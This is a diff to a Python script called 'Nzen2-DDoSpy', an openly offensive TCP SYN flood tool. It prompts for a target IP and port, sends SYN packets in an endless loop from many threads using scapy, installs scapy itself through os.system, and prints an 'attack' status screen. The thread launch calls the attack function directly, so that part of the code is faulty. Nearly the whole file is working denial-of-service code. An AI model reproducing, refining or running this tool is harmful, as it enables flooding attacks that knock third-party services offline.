@@ -3,13 +3,18 @@
 #Imports:
 import os
 import sys
+import socket
 from platform import platform
 from os import listdir
 os.system('pip3 install scapy')
 from scapy.all import *
 import threading
-version = 'v Alpha 0.2'
-packets_sent = 0
+version = 'v Alpha 0.3'
+def get_ip_address():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    return s.getsockname()[0]
+
 # Change version in var
 
 title = '''
@@ -89,35 +94,39 @@ print(secondscr())
 target_ip = input("IP:")
 target_port = input("Port:")
 
-def info():
-    destip = target_ip
-    destport = target_port
-    orginip = socket.gethostbyname(localhost)
 
-    print('''
-Nzen2-DDoSpy Info screen:
+destip = target_ip
+destport = target_port
 
-Attack type: TCP flood
-    Sender IP: '''+orginip+'''
-    Destination IP: '''+destip+'''
-    Destination Port: '''+destport+'''
 
-    Packets sent: '''+packets_sent+'''
-
-            ''')
+packets_sent = 0
 
 def attack():
     while True:
         p = IP(dst= target_ip) / TCP(flags="S",  sport=RandShort(),  dport=int(target_port))
-        send(p , verbose=0, loop=0)
-        packets_sent + 1
+        send(p , verbose=1, loop=0)
+        global packets_sent
+        packets_sent += 1
+        
+        print(infoui)
 
-os.system('pause')
+infoui = '''
 
-for i in range(0,20):
+Nzen2-DDoSpy Info screen:
+
+Attack type: TCP flood
+    Sender IP: 
+    Destination IP: '''+str(destip)+'''
+    Destination Port: '''+str(destport)+'''
+
+    Packets sent: '''+str(packets_sent)+'''
+
+            '''
+
+for i in range(0,100):
     Thread = threading.Thread(target=attack())
     Thread.start()
-info()
+    
 
 
 input("Press Enter to exit:")
